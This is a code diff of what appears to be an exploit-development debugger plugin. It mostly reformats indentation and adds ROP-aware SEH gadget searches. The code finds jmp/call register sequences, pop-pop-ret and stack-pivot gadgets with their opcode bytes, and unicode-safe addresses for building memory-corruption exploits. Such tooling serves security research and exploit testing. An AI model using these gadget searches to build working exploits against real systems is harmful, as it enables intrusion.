-    string with unicode transform info, or empty if address is not unicode transform
-    """
-    outstring = ""
-    transform=0
-    almosttransform=0
-    begin = hexaddr[0] + hexaddr[1]
-    middle = hexaddr[4] + hexaddr[5]
-    twostr=hexaddr[2]+hexaddr[3]
-    begintwostr = hexaddr[6]+hexaddr[7]
-    threestr=hexaddr[4]+hexaddr[5]+hexaddr[6]
-    fourstr=hexaddr[4]+hexaddr[5]+hexaddr[6]+hexaddr[7]
-    beginfourstr = hexaddr[0]+hexaddr[1]+hexaddr[2]+hexaddr[3]
-    threestr=threestr.upper()
-    fourstr=fourstr.upper()
-    begintwostr = begintwostr.upper()
-    beginfourstr = beginfourstr.upper()
-    uniansiconv = [  ["20AC","80"], ["201A","82"],
-        ["0192","83"], ["201E","84"], ["2026","85"],
-        ["2020","86"], ["2021","87"], ["02C6","88"],
-        ["2030","89"], ["0106","8A"], ["2039","8B"],
-        ["0152","8C"], ["017D","8E"], ["2018","91"],
-        ["2019","92"], ["201C","93"], ["201D","94"],
-        ["2022","95"], ["2013","96"], ["2014","97"],
-        ["02DC","98"], ["2122","99"], ["0161","9A"],
-        ["203A","9B"], ["0153","9C"], ["017E","9E"],
-        ["0178","9F"]
-        ]
-    # 4 possible cases :
-    # 00xxBBBB
-    # 00xxBBBC (close transform)
-    # AAAA00xx
-    # AAAABBBB
-    convbyte=""
-    transbyte=""
-    ansibytes=""
-    #case 1 and 2
-    if begin == "00":   
-        for ansirec in uniansiconv:
-            if ansirec[0]==fourstr:
-                convbyte=ansirec[1]
-                transbyte=ansirec[1]
-                transform=1
-                break
-        if transform==1:
-            outstring +="unicode ansi transformed : 00"+twostr+"00"+convbyte+","
-        ansistring=""
-        for ansirec in uniansiconv:
-            if ansirec[0][:3]==threestr:
-                if (transform==0) or (transform==1 and ansirec[1] <> transbyte):
-                    convbyte=ansirec[1]
-                    ansibytes=ansirec[0]
-                    ansistring=ansistring+"00"+twostr+"00"+convbyte+"->00"+twostr+ansibytes+" / "
-                    almosttransform=1
-        if almosttransform==1:
-            if transform==0:
-                outstring += "unicode possible ansi transform(s) : " + ansistring
-            else:
-                outstring +=" / alternatives (close pointers) : " + ansistring
-            
-    #case 3
-    if middle == "00":
-        transform = 0
-        for ansirec in uniansiconv:
-            if ansirec[0]==beginfourstr:
-                convbyte=ansirec[1]
-                transform=1
-                break
-        if transform==1:
-            outstring +="unicode ansi transformed : 00"+convbyte+"00"+begintwostr+","
-    #case 4
-    if begin != "00" and middle != "00":
-        convbyte1=""
-        convbyte2=""
-        transform = 0
-        for ansirec in uniansiconv:
-            if ansirec[0]==beginfourstr:
-                convbyte1=ansirec[1]
-                transform=1
-                break
-        if transform == 1:
-            for ansirec in uniansiconv:
-                if ansirec[0]==fourstr:
-                    convbyte2=ansirec[1]
-                    transform=2 
-                    break                       
-        if transform==2:
-            outstring +="unicode ansi transformed : 00"+convbyte1+"00"+convbyte2+","
-    
-    # done
-    outstring = outstring.rstrip(" / ")
-    
-    if outstring:
-        if not outstring.endswith(","):
-            outstring += ","
-    return outstring
+	"""
+	checks if the address can be used as unicode ansi transform
+	
+	Arguments:
+	hexaddr  - a string containing the address in hex format (4 bytes - 8 characters)
+	
+	Return:
+	string with unicode transform info, or empty if address is not unicode transform
+	"""
+	outstring = ""
+	transform=0
+	almosttransform=0
+	begin = hexaddr[0] + hexaddr[1]
+	middle = hexaddr[4] + hexaddr[5]
+	twostr=hexaddr[2]+hexaddr[3]
+	begintwostr = hexaddr[6]+hexaddr[7]
+	threestr=hexaddr[4]+hexaddr[5]+hexaddr[6]
+	fourstr=hexaddr[4]+hexaddr[5]+hexaddr[6]+hexaddr[7]
+	beginfourstr = hexaddr[0]+hexaddr[1]+hexaddr[2]+hexaddr[3]
+	threestr=threestr.upper()
+	fourstr=fourstr.upper()
+	begintwostr = begintwostr.upper()
+	beginfourstr = beginfourstr.upper()
+	uniansiconv = [  ["20AC","80"], ["201A","82"],
+		["0192","83"], ["201E","84"], ["2026","85"],
+		["2020","86"], ["2021","87"], ["02C6","88"],
+		["2030","89"], ["0106","8A"], ["2039","8B"],
+		["0152","8C"], ["017D","8E"], ["2018","91"],
+		["2019","92"], ["201C","93"], ["201D","94"],
+		["2022","95"], ["2013","96"], ["2014","97"],
+		["02DC","98"], ["2122","99"], ["0161","9A"],
+		["203A","9B"], ["0153","9C"], ["017E","9E"],
+		["0178","9F"]
+		]
+	# 4 possible cases :
+	# 00xxBBBB
+	# 00xxBBBC (close transform)
+	# AAAA00xx
+	# AAAABBBB
+	convbyte=""
+	transbyte=""
+	ansibytes=""
+	#case 1 and 2
+	if begin == "00":	
+		for ansirec in uniansiconv:
+			if ansirec[0]==fourstr:
+				convbyte=ansirec[1]
+				transbyte=ansirec[1]
+				transform=1
+				break
+		if transform==1:
+			outstring +="unicode ansi transformed : 00"+twostr+"00"+convbyte+","
+		ansistring=""
+		for ansirec in uniansiconv:
+			if ansirec[0][:3]==threestr:
+				if (transform==0) or (transform==1 and ansirec[1] != transbyte):
+					convbyte=ansirec[1]
+					ansibytes=ansirec[0]
+					ansistring=ansistring+"00"+twostr+"00"+convbyte+"->00"+twostr+ansibytes+" / "
+					almosttransform=1
+		if almosttransform==1:
+			if transform==0:
+				outstring += "unicode possible ansi transform(s) : " + ansistring
+			else:
+				outstring +=" / alternatives (close pointers) : " + ansistring
+			
+	#case 3
+	if middle == "00":
+		transform = 0
+		for ansirec in uniansiconv:
+			if ansirec[0]==beginfourstr:
+				convbyte=ansirec[1]
+				transform=1
+				break
+		if transform==1:
+			outstring +="unicode ansi transformed : 00"+convbyte+"00"+begintwostr+","
+	#case 4
+	if begin != "00" and middle != "00":
+		convbyte1=""
+		convbyte2=""
+		transform = 0
+		for ansirec in uniansiconv:
+			if ansirec[0]==beginfourstr:
+				convbyte1=ansirec[1]
+				transform=1
+				break
+		if transform == 1:
+			for ansirec in uniansiconv:
+				if ansirec[0]==fourstr:
+					convbyte2=ansirec[1]
+					transform=2	
+					break						
+		if transform==2:
+			outstring +="unicode ansi transformed : 00"+convbyte1+"00"+convbyte2+","
+	
+	# done
+	outstring = outstring.rstrip(" / ")
+	
+	if outstring:
+		if not outstring.endswith(","):
+			outstring += ","
+	return outstring
 
     
 def getSearchSequences(searchtype,searchcriteria="",type="",criteria={}):
-    """
-    will build array with search sequences for a given search type
-    
-    Arguments:
-    searchtype = "jmp", "seh"
-    
-    SearchCriteria (optional): 
-        <register> in case of "jmp" : string containing a register
-    
-    Return:
-    array with all searches to perform
-    """
-    offsets = [ "", "0x04","0x08","0x0c","0x10","0x12","0x1C","0x20","0x24"]
-    regs=["eax","ebx","ecx","edx","esi","edi","ebp"]
-    search=[]
-    
-    if searchtype.lower() == "jmp":
-        if not searchcriteria: 
-            searchcriteria = "esp"
-        searchcriteria = searchcriteria.lower()
-    
-        min = 0
-        max = 0
-        
-        if "mindistance" in criteria:
-            min = criteria["mindistance"]
-        if "maxdistance" in criteria:
-            max = criteria["maxdistance"]
-        
-        minval = min
-        
-        while minval <= max:
-        
-            extraval = ""
-            
-            if minval <> 0:
-                operator = ""
-                negoperator = "-"
-                if minval < 0:
-                    operator = "-"
-                    negoperator = ""
-                thisval = str(minval).replace("-","")
-                thishexval = toHex(int(thisval))
-                
-                extraval = operator + thishexval
-            
-            if minval == 0:
-                search.append("jmp " + searchcriteria )
-                search.append("call " + searchcriteria)
-                
-                for roffset in offsets:
-                    search.append("push "+searchcriteria+"\nret "+roffset)
-                    
-                for reg in regs:
-                    if reg != searchcriteria:
-                        search.append("push " + searchcriteria + "\npop "+reg+"\njmp "+reg)
-                        search.append("push " + searchcriteria + "\npop "+reg+"\ncall "+reg)            
-                        search.append("mov "+reg+"," + searchcriteria + "\njmp "+reg)
-                        search.append("mov "+reg+"," + searchcriteria + "\ncall "+reg)
-                        search.append("xchg "+reg+","+searchcriteria+"\njmp " + reg)
-                        search.append("xchg "+reg+","+searchcriteria+"\ncall " + reg)               
-                        for roffset in offsets:
-                            search.append("push " + searchcriteria + "\npop "+reg+"\npush "+reg+"\nret "+roffset)           
-                            search.append("mov "+reg+"," + searchcriteria + "\npush "+reg+"\nret "+roffset)
-                            search.append("xchg "+reg+","+searchcriteria+"\npush " + reg + "\nret " + roffset)  
-            else:
-                # offset jumps
-                search.append("add " + searchcriteria + "," + operator + thishexval + "\njmp " + searchcriteria)
-                search.append("add " + searchcriteria + "," + operator + thishexval + "\ncall " + searchcriteria)
-                search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\njmp " + searchcriteria)
-                search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\ncall " + searchcriteria)
-                for roffset in offsets:
-                    search.append("add " + searchcriteria + "," + operator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
-                    search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
-                if minval > 0:
-                    search.append("jmp " + searchcriteria + extraval)
-                    search.append("call " + searchcriteria + extraval)
-            minval += 1
+	"""
+	will build array with search sequences for a given search type
+	
+	Arguments:
+	searchtype = "jmp", "seh"
+	
+	SearchCriteria (optional): 
+		<register> in case of "jmp" : string containing a register
+	
+	Return:
+	array with all searches to perform
+	"""
+	offsets = [ "", "0x04","0x08","0x0c","0x10","0x12","0x1C","0x20","0x24"]
+	regs=["eax","ebx","ecx","edx","esi","edi","ebp"]
+	search=[]
+	
+	if searchtype.lower() == "jmp":
+		if not searchcriteria: 
+			searchcriteria = "esp"
+		searchcriteria = searchcriteria.lower()
+	
+		min = 0
+		max = 0
+		
+		if "mindistance" in criteria:
+			min = criteria["mindistance"]
+		if "maxdistance" in criteria:
+			max = criteria["maxdistance"]
+		
+		minval = min
+		
+		while minval <= max:
+		
+			extraval = ""
+			
+			if minval != 0:
+				operator = ""
+				negoperator = "-"
+				if minval < 0:
+					operator = "-"
+					negoperator = ""
+				thisval = str(minval).replace("-","")
+				thishexval = toHex(int(thisval))
+				
+				extraval = operator + thishexval
+			
+			if minval == 0:
+				search.append("jmp " + searchcriteria )
+				search.append("call " + searchcriteria)
+				
+				for roffset in offsets:
+					search.append("push "+searchcriteria+"\nret "+roffset)
+					
+				for reg in regs:
+					if reg != searchcriteria:
+						search.append("push " + searchcriteria + "\npop "+reg+"\njmp "+reg)
+						search.append("push " + searchcriteria + "\npop "+reg+"\ncall "+reg)			
+						search.append("mov "+reg+"," + searchcriteria + "\njmp "+reg)
+						search.append("mov "+reg+"," + searchcriteria + "\ncall "+reg)
+						search.append("xchg "+reg+","+searchcriteria+"\njmp " + reg)
+						search.append("xchg "+reg+","+searchcriteria+"\ncall " + reg)				
+						for roffset in offsets:
+							search.append("push " + searchcriteria + "\npop "+reg+"\npush "+reg+"\nret "+roffset)			
+							search.append("mov "+reg+"," + searchcriteria + "\npush "+reg+"\nret "+roffset)
+							search.append("xchg "+reg+","+searchcriteria+"\npush " + reg + "\nret " + roffset)	
+			else:
+				# offset jumps
+				search.append("add " + searchcriteria + "," + operator + thishexval + "\njmp " + searchcriteria)
+				search.append("add " + searchcriteria + "," + operator + thishexval + "\ncall " + searchcriteria)
+				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\njmp " + searchcriteria)
+				search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\ncall " + searchcriteria)
+				for roffset in offsets:
+					search.append("add " + searchcriteria + "," + operator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
+					search.append("sub " + searchcriteria + "," + negoperator + thishexval + "\npush " + searchcriteria + "\nret " + roffset)
+				if minval > 0:
+					search.append("jmp " + searchcriteria + extraval)
+					search.append("call " + searchcriteria + extraval)
+			minval += 1
 
-    if searchtype.lower() == "seh":
-        for roffset in offsets:
-            for r1 in regs:
-                search.append( ["add esp,4\npop " + r1+"\nret "+roffset,dbg.assemble("add esp,4\npop " + r1+"\nret "+roffset)] )
-                search.append( ["pop " + r1+"\nadd esp,4\nret "+roffset,dbg.assemble("pop " + r1+"\nadd esp,4\nret "+roffset)] )                
-                for r2 in regs:
-                    thissearch = ["pop "+r1+"\npop "+r2+"\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\nret "+roffset)]
-                    search.append( thissearch )
-                    if type == "rop":
-                        search.append( ["pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset)] )
-                        for r3 in regs:
-                            search.append( ["pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]",dbg.assemble("pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]")] )
-            search.append( ["add esp,8\nret "+roffset,dbg.assemble("add esp,8\nret "+roffset)])
-            search.append( ["popad\npush ebp\nret "+roffset,dbg.assemble("popad\npush ebp\nret "+roffset)])                 
-        #popad + jmp/call
-        search.append(["popad\njmp ebp",dbg.assemble("popad\njmp ebp")])
-        search.append(["popad\ncall ebp",dbg.assemble("popad\ncall ebp")])      
-        #call / jmp dword
-        search.append(["call dword ptr ss:[esp+08]","\xff\x54\x24\x08"])
-        search.append(["call dword ptr ss:[esp+08]","\xff\x94\x24\x08\x00\x00\x00"])
-        search.append(["call dword ptr ds:[esp+08]","\x3e\xff\x54\x24\x08"])
+	if searchtype.lower() == "seh":
+		if type == "rop":
+			dbg.log("    - Looking for addresses that will help with SEH overwrite & ROP" )
+		for roffset in offsets:
+			for r1 in regs:
+				if type == "rop":
+					search.append( ["add esp,4\npop " + r1+"\npop esp\nret "+roffset,dbg.assemble("add esp,4\npop " + r1+"\npop esp\nret "+roffset)] )
+					search.append( ["pop " + r1+"\nadd esp,4\npop esp\nret "+roffset,dbg.assemble("pop " + r1+"\nadd esp,4\npop esp\nret "+roffset)] )				
+				else:
+					search.append( ["add esp,4\npop " + r1+"\nret "+roffset,dbg.assemble("add esp,4\npop " + r1+"\nret "+roffset)] )
+					search.append( ["pop " + r1+"\nadd esp,4\nret "+roffset,dbg.assemble("pop " + r1+"\nadd esp,4\nret "+roffset)] )
+				for r2 in regs:
+					if type == "rop":
+						search.append( ["pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\npop esp\nret "+roffset)] )
+						for r3 in regs:
+							search.append( ["pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]",dbg.assemble("pop "+r1+"\npop "+r2+"\npop "+r3+"\ncall ["+r3+"]")] )
+					else:
+						thissearch = ["pop "+r1+"\npop "+r2+"\nret "+roffset,dbg.assemble("pop "+r1+"\npop "+r2+"\nret "+roffset)]
+						search.append( thissearch )
+			if type != "rop":		
+				search.append( ["add esp,8\nret "+roffset,dbg.assemble("add esp,8\nret "+roffset)])
+				search.append( ["popad\npush ebp\nret "+roffset,dbg.assemble("popad\npush ebp\nret "+roffset)])
+			else:
+				search.append( ["add esp,8\npop esp\nret "+roffset,dbg.assemble("add esp,8\npop esp\nret "+roffset)])
+		if type != "rop":
+			#popad + jmp/call
+			search.append(["popad\njmp ebp",dbg.assemble("popad\njmp ebp")])
+			search.append(["popad\ncall ebp",dbg.assemble("popad\ncall ebp")])		
+			#call / jmp dword
+			search.append(["call dword ptr ss:[esp+08]","\xff\x54\x24\x08"])
+			search.append(["call dword ptr ss:[esp+08]","\xff\x94\x24\x08\x00\x00\x00"])
+			search.append(["call dword ptr ds:[esp+08]","\x3e\xff\x54\x24\x08"])
 
-        search.append(["jmp dword ptr ss:[esp+08]","\xff\x64\x24\x08"])
-        search.append(["jmp dword ptr ss:[esp+08]","\xff\xa4\x24\x08\x00\x00\x00"])
-        search.append(["jmp dword ptr ds:[esp+08]","\x3e\xff\x64\x24\x08"])
-        
-        search.append(["call dword ptr ss:[esp+14]","\xff\x54\x24\x14"])
-        search.append(["call dword ptr ss:[esp+14]","\xff\x94\x24\x14\x00\x00\x00"])    
-        search.append(["call dword ptr ds:[esp+14]","\x3e\xff\x54\x24\x14"])
-        
-        search.append(["jmp dword ptr ss:[esp+14]","\xff\x64\x24\x14"])
-        search.append(["jmp dword ptr ss:[esp+14]","\xff\xa4\x24\x14\x00\x00\x00"])     
-        search.append(["jmp dword ptr ds:[esp+14]","\x3e\xff\x64\x24\x14"])
-        
-        search.append(["call dword ptr ss:[esp+1c]","\xff\x54\x24\x1c"])
-        search.append(["call dword ptr ss:[esp+1c]","\xff\x94\x24\x1c\x00\x00\x00"])        
-        search.append(["call dword ptr ds:[esp+1c]","\x3e\xff\x54\x24\x1c"])
-        
-        search.append(["jmp dword ptr ss:[esp+1c]","\xff\x64\x24\x1c"])
-        search.append(["jmp dword ptr ss:[esp+1c]","\xff\xa4\x24\x1c\x00\x00\x00"])     
-        search.append(["jmp dword ptr ds:[esp+1c]","\x3e\xff\x64\x24\x1c"])
-        
-        search.append(["call dword ptr ss:[esp+2c]","\xff\x54\x24\x2c"])
-        search.append(["call dword ptr ss:[esp+2c]","\xff\x94\x24\x2c\x00\x00\x00"])
-        search.append(["call dword ptr ds:[esp+2c]","\x3e\xff\x54\x24\x2c"])
+			search.append(["jmp dword ptr ss:[esp+08]","\xff\x64\x24\x08"])
+			search.append(["jmp dword ptr ss:[esp+08]","\xff\xa4\x24\x08\x00\x00\x00"])
+			search.append(["jmp dword ptr ds:[esp+08]","\x3e\xff\x64\x24\x08"])
+			
+			search.append(["call dword ptr ss:[esp+14]","\xff\x54\x24\x14"])
+			search.append(["call dword ptr ss:[esp+14]","\xff\x94\x24\x14\x00\x00\x00"])	
+			search.append(["call dword ptr ds:[esp+14]","\x3e\xff\x54\x24\x14"])
+			
+			search.append(["jmp dword ptr ss:[esp+14]","\xff\x64\x24\x14"])
+			search.append(["jmp dword ptr ss:[esp+14]","\xff\xa4\x24\x14\x00\x00\x00"])		
+			search.append(["jmp dword ptr ds:[esp+14]","\x3e\xff\x64\x24\x14"])
+			
+			search.append(["call dword ptr ss:[esp+1c]","\xff\x54\x24\x1c"])
+			search.append(["call dword ptr ss:[esp+1c]","\xff\x94\x24\x1c\x00\x00\x00"])		
+			search.append(["call dword ptr ds:[esp+1c]","\x3e\xff\x54\x24\x1c"])
+			
+			search.append(["jmp dword ptr ss:[esp+1c]","\xff\x64\x24\x1c"])
+			search.append(["jmp dword ptr ss:[esp+1c]","\xff\xa4\x24\x1c\x00\x00\x00"])		
+			search.append(["jmp dword ptr ds:[esp+1c]","\x3e\xff\x64\x24\x1c"])
+			
+			search.append(["call dword ptr ss:[esp+2c]","\xff\x54\x24\x2c"])
+			search.append(["call dword ptr ss:[esp+2c]","\xff\x94\x24\x2c\x00\x00\x00"])
+			search.append(["call dword ptr ds:[esp+2c]","\x3e\xff\x54\x24\x2c"])
 
-        search.append(["jmp dword ptr ss:[esp+2c]","\xff\x64\x24\x2c"])
-        search.append(["jmp dword ptr ss:[esp+2c]","\xff\xa4\x24\x2c\x00\x00\x00"])     
-        search.append(["jmp dword ptr ds:[esp+2c]","\x3e\xff\x64\x24\x2c"])
-        
-        search.append(["call dword ptr ss:[esp+44]","\xff\x54\x24\x44"])
-        search.append(["call dword ptr ss:[esp+44]","\xff\x94\x24\x44\x00\x00\x00"])        
-        search.append(["call dword ptr ds:[esp+44]","\x3e\xff\x54\x24\x44"])        
-        
-        search.append(["jmp dword ptr ss:[esp+44]","\xff\x64\x24\x44"])
-        search.append(["jmp dword ptr ss:[esp+44]","\xff\xa4\x24\x44\x00\x00\x00"])
-        search.append(["jmp dword ptr ds:[esp+44]","\x3e\xff\x64\x24\x44"])
-        
-        search.append(["call dword ptr ss:[esp+50]","\xff\x54\x24\x50"])
-        search.append(["call dword ptr ss:[esp+50]","\xff\x94\x24\x50\x00\x00\x00"])        
-        search.append(["call dword ptr ds:[esp+50]","\x3e\xff\x54\x24\x50"])        
-        
-        search.append(["jmp dword ptr ss:[esp+50]","\xff\x64\x24\x50"])
-        search.append(["jmp dword ptr ss:[esp+50]","\xff\xa4\x24\x50\x00\x00\x00"])
-        search.append(["jmp dword ptr ds:[esp+50]","\x3e\xff\x64\x24\x50"])
-        
-        search.append(["call dword ptr ss:[ebp+0c]","\xff\x55\x0c"])
-        search.append(["call dword ptr ss:[ebp+0c]","\xff\x95\x0c\x00\x00\x00"])        
-        search.append(["call dword ptr ds:[ebp+0c]","\x3e\xff\x55\x0c"])        
-        
-        search.append(["jmp dword ptr ss:[ebp+0c]","\xff\x65\x0c"])
-        search.append(["jmp dword ptr ss:[ebp+0c]","\xff\xa5\x0c\x00\x00\x00"])     
-        search.append(["jmp dword ptr ds:[ebp+0c]","\x3e\xff\x65\x0c"])     
-        
-        search.append(["call dword ptr ss:[ebp+24]","\xff\x55\x24"])
-        search.append(["call dword ptr ss:[ebp+24]","\xff\x95\x24\x00\x00\x00"])        
-        search.append(["call dword ptr ds:[ebp+24]","\x3e\xff\x55\x24"])
-        
-        search.append(["jmp dword ptr ss:[ebp+24]","\xff\x65\x24"])
-        search.append(["jmp dword ptr ss:[ebp+24]","\xff\xa5\x24\x00\x00\x00"])     
-        search.append(["jmp dword ptr ds:[ebp+24]","\x3e\xff\x65\x24"]) 
-        
-        search.append(["call dword ptr ss:[ebp+30]","\xff\x55\x30"])
-        search.append(["call dword ptr ss:[ebp+30]","\xff\x95\x30\x00\x00\x00"])        
-        search.append(["call dword ptr ds:[ebp+30]","\x3e\xff\x55\x30"])
-        
-        search.append(["jmp dword ptr ss:[ebp+30]","\xff\x65\x30"])
-        search.append(["jmp dword ptr ss:[ebp+30]","\xff\xa5\x30\x00\x00\x00"])     
-        search.append(["jmp dword ptr ds:[ebp+30]","\x3e\xff\x65\x30"]) 
-        
-        search.append(["call dword ptr ss:[ebp-04]","\xff\x55\xfc"])
-        search.append(["call dword ptr ss:[ebp-04]","\xff\x95\xfc\xff\xff\xff"])        
-        search.append(["call dword ptr ds:[ebp-04]","\x3e\xff\x55\xfc"])
-        
-        search.append(["jmp dword ptr ss:[ebp-04]","\xff\x65\xfc",])
-        search.append(["jmp dword ptr ss:[ebp-04]","\xff\xa5\xfc\xff\xff\xff",])        
-        search.append(["jmp dword ptr ds:[ebp-04]","\x3e\xff\x65\xfc",])        
-        
-        search.append(["call dword ptr ss:[ebp-0c]","\xff\x55\xf4"])
-        search.append(["call dword ptr ss:[ebp-0c]","\xff\x95\xf4\xff\xff\xff"])        
-        search.append(["call dword ptr ds:[ebp-0c]","\x3e\xff\x55\xf4"])
-        
-        search.append(["jmp dword ptr ss:[ebp-0c]","\xff\x65\xf4",])
-        search.append(["jmp dword ptr ss:[ebp-0c]","\xff\xa5\xf4\xff\xff\xff",])        
-        search.append(["jmp dword ptr ds:[ebp-0c]","\x3e\xff\x65\xf4",])
-        
-        search.append(["call dword ptr ss:[ebp-18]","\xff\x55\xe8"])
-        search.append(["call dword ptr ss:[ebp-18]","\xff\x95\xe8\xff\xff\xff"])        
-        search.append(["call dword ptr ds:[ebp-18]","\x3e\xff\x55\xe8"])
-        
-        search.append(["jmp dword ptr ss:[ebp-18]","\xff\x65\xe8",])
-        search.append(["jmp dword ptr ss:[ebp-18]","\xff\xa5\xe8\xff\xff\xff",])        
-        search.append(["jmp dword ptr ds:[ebp-18]","\x3e\xff\x65\xe8",])
-    return search
+			search.append(["jmp dword ptr ss:[esp+2c]","\xff\x64\x24\x2c"])
+			search.append(["jmp dword ptr ss:[esp+2c]","\xff\xa4\x24\x2c\x00\x00\x00"])		
+			search.append(["jmp dword ptr ds:[esp+2c]","\x3e\xff\x64\x24\x2c"])
+			
+			search.append(["call dword ptr ss:[esp+44]","\xff\x54\x24\x44"])
+			search.append(["call dword ptr ss:[esp+44]","\xff\x94\x24\x44\x00\x00\x00"])		
+			search.append(["call dword ptr ds:[esp+44]","\x3e\xff\x54\x24\x44"])		
+			
+			search.append(["jmp dword ptr ss:[esp+44]","\xff\x64\x24\x44"])
+			search.append(["jmp dword ptr ss:[esp+44]","\xff\xa4\x24\x44\x00\x00\x00"])
+			search.append(["jmp dword ptr ds:[esp+44]","\x3e\xff\x64\x24\x44"])
+			
+			search.append(["call dword ptr ss:[esp+50]","\xff\x54\x24\x50"])
+			search.append(["call dword ptr ss:[esp+50]","\xff\x94\x24\x50\x00\x00\x00"])		
+			search.append(["call dword ptr ds:[esp+50]","\x3e\xff\x54\x24\x50"])		
+			
+			search.append(["jmp dword ptr ss:[esp+50]","\xff\x64\x24\x50"])
+			search.append(["jmp dword ptr ss:[esp+50]","\xff\xa4\x24\x50\x00\x00\x00"])
+			search.append(["jmp dword ptr ds:[esp+50]","\x3e\xff\x64\x24\x50"])
+			
+			search.append(["call dword ptr ss:[ebp+0c]","\xff\x55\x0c"])
+			search.append(["call dword ptr ss:[ebp+0c]","\xff\x95\x0c\x00\x00\x00"])		
+			search.append(["call dword ptr ds:[ebp+0c]","\x3e\xff\x55\x0c"])		
+			
+			search.append(["jmp dword ptr ss:[ebp+0c]","\xff\x65\x0c"])
+			search.append(["jmp dword ptr ss:[ebp+0c]","\xff\xa5\x0c\x00\x00\x00"])		
+			search.append(["jmp dword ptr ds:[ebp+0c]","\x3e\xff\x65\x0c"])		
+			
+			search.append(["call dword ptr ss:[ebp+24]","\xff\x55\x24"])
+			search.append(["call dword ptr ss:[ebp+24]","\xff\x95\x24\x00\x00\x00"])		
+			search.append(["call dword ptr ds:[ebp+24]","\x3e\xff\x55\x24"])
+			
+			search.append(["jmp dword ptr ss:[ebp+24]","\xff\x65\x24"])
+			search.append(["jmp dword ptr ss:[ebp+24]","\xff\xa5\x24\x00\x00\x00"])		
+			search.append(["jmp dword ptr ds:[ebp+24]","\x3e\xff\x65\x24"])	
+			
+			search.append(["call dword ptr ss:[ebp+30]","\xff\x55\x30"])
+			search.append(["call dword ptr ss:[ebp+30]","\xff\x95\x30\x00\x00\x00"])		
+			search.append(["call dword ptr ds:[ebp+30]","\x3e\xff\x55\x30"])
+			
+			search.append(["jmp dword ptr ss:[ebp+30]","\xff\x65\x30"])
+			search.append(["jmp dword ptr ss:[ebp+30]","\xff\xa5\x30\x00\x00\x00"])		
+			search.append(["jmp dword ptr ds:[ebp+30]","\x3e\xff\x65\x30"])	
+			
+			search.append(["call dword ptr ss:[ebp-04]","\xff\x55\xfc"])
+			search.append(["call dword ptr ss:[ebp-04]","\xff\x95\xfc\xff\xff\xff"])		
+			search.append(["call dword ptr ds:[ebp-04]","\x3e\xff\x55\xfc"])
+			
+			search.append(["jmp dword ptr ss:[ebp-04]","\xff\x65\xfc",])
+			search.append(["jmp dword ptr ss:[ebp-04]","\xff\xa5\xfc\xff\xff\xff",])		
+			search.append(["jmp dword ptr ds:[ebp-04]","\x3e\xff\x65\xfc",])		
+			
+			search.append(["call dword ptr ss:[ebp-0c]","\xff\x55\xf4"])
+			search.append(["call dword ptr ss:[ebp-0c]","\xff\x95\xf4\xff\xff\xff"])		
+			search.append(["call dword ptr ds:[ebp-0c]","\x3e\xff\x55\xf4"])
+			
+			search.append(["jmp dword ptr ss:[ebp-0c]","\xff\x65\xf4",])
+			search.append(["jmp dword ptr ss:[ebp-0c]","\xff\xa5\xf4\xff\xff\xff",])		
+			search.append(["jmp dword ptr ds:[ebp-0c]","\x3e\xff\x65\xf4",])
+			
+			search.append(["call dword ptr ss:[ebp-18]","\xff\x55\xe8"])
+			search.append(["call dword ptr ss:[ebp-18]","\xff\x95\xe8\xff\xff\xff"])		
+			search.append(["call dword ptr ds:[ebp-18]","\x3e\xff\x55\xe8"])
+			
+			search.append(["jmp dword ptr ss:[ebp-18]","\xff\x65\xe8",])
+			search.append(["jmp dword ptr ss:[ebp-18]","\xff\xa5\xe8\xff\xff\xff",])		
+			search.append(["jmp dword ptr ds:[ebp-18]","\x3e\xff\x65\xe8",])
+	return search
 
     
 def getModulesToQuery(criteria):
@@ -5704,24 +5780,24 @@ def getPointerAccess(address):
 
 
 def getModuleProperty(modname,parameter):
-    """
-    Returns value of a given module property
-    Argument : 
-    modname - module name
-    parameter name - (see populateModuleInfo())
-    
-    Returns : 
-    value associcated with the given parameter / module combination
-    
-    """
-    modname=modname.strip()
-    parameter=parameter.lower()
-    valtoreturn=""
-    # try case sensitive first
-    for thismodule,modproperties in g_modules.iteritems():
-        if thismodule.strip() == modname:
-            return modproperties[parameter]
-    return valtoreturn
+	"""
+	Returns value of a given module property
+	Argument : 
+	modname - module name
+	parameter name - (see populateModuleInfo())
+	
+	Returns : 
+	value associated with the given parameter / module combination
+	
+	"""
+	modname=modname.strip()
+	parameter=parameter.lower()
+	valtoreturn=""
+	# try case sensitive first
+	for thismodule,modproperties in g_modules.iteritems():
+		if thismodule.strip() == modname:
+			return modproperties[parameter]
+	return valtoreturn
 
 
 def populateModuleInfo():
@@ -6217,30 +6293,33 @@ def assemble(instructions,encoder=""):
 
 
 
-    
-def findROPGADGETS(modulecriteria={},criteria={},endings=[],maxoffset=40,depth=5,split=False,pivotdistance=0,fast=False,mode="all"):
-    """
-    Searches for rop gadgets
+	
+def findROPGADGETS(modulecriteria={},criteria={},endings=[],maxoffset=40,depth=5,split=False,pivotdistance=0,fast=False,mode="all", sortedprint=False, technique=""):
+	"""
+	Searches for rop gadgets
 
-    Arguments:
-    modulecriteria - dictionary with criteria modules need to comply with.
-                     Default settings are : ignore aslr and rebased modules
-    criteria - dictionary with criteria the pointers need to comply with.
-    endings - array with all rop gadget endings to look for. Default : RETN and RETN+offsets
-    maxoffset - maximum offset value for RETN if endings are set to RETN
-    depth - maximum number of instructions to go back
-    split - Boolean that indicates whether routine should write all gadgets to one file, or split per module
-    pivotdistance - minimum distance a stackpivot needs to be
-    fast - Boolean indicating if you want to process less obvious gadgets as well
-    mode - internal use only
-    
-    Return:
-    Output is written to files, containing rop gadgets, suggestions, stack pivots and virtualprotect/virtualalloc routine (if possible)
-    """
-    
-    found_opcodes = {}
-    all_opcodes = {}
